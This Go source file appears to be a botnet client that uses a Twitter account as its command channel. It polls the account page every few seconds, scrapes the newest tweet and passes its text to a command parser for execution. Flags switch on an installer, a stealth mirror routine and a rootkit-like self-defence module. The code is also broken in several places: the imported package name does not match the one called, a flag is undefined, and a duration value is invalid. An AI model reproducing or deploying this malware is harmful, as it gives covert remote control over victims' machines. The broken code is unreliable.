package main

import (
  "commander"
  "installer"
  "self_defence"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
	"os"
)

var (
	account string = "Boss"
	slumber time.Duration = 2.5
	cmd string = ""

	enable_install bool = false
	enable_stealth bool = false
	enable_self_defence bool = false
)

func main() {

	if enable_install {
		installer.Install()
	}

	if enable_stealth && enable_install {
		self_defence.Mirror()
	}

	if enable_rootkit && enable_stealth && enable_install {
		go self_defence.Install()
	}


	fmt.Println("account:\t\t", account)
	fmt.Println("Refresh interval:\t", int(slumber), "\n")

	fmt.Println("Awaiting commands...")

	for true {
		go refresh()
		time.Sleep(time.Second * slumber)
	}
}

func refresh() {
	lines := getContent()
 	if lines == nil {
 		return
 	}

	for i := 0; i < len(lines); i++ {
		if strings.Contains(lines[i], "data-aria-label-part=\"0\">") {
			temp := strings.Split(strings.Split(lines[i], "data-aria-label-part=\"0\">")[1], "<")[0]
			if cmd != temp && !strings.Contains(temp, "!clear") {
				cmd = temp
				fmt.Println("New command found:", cmd)
				command.Parse(cmd)
			} else if strings.Contains(temp, "!clear") {
				cmd = "!clear"
			}

			i = len(lines)
		}
	}
}

func getContent() (lines []string) {
	res, err := http.Get("https://twitter.com/" + account)
	if err != nil {
		fmt.Println("Bad connection! Sleeping for", int(slumber), "seconds")
		return nil
	}

	content, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		fmt.Println("Bad connection! Sleeping for", int(slumber), "seconds")
		return nil
	}

	return strings.Split(string(content), "\n")
}

func isTrue(option bool) string {
	if option {
		return "Yes"
	} else {
		return "No"
	}
}
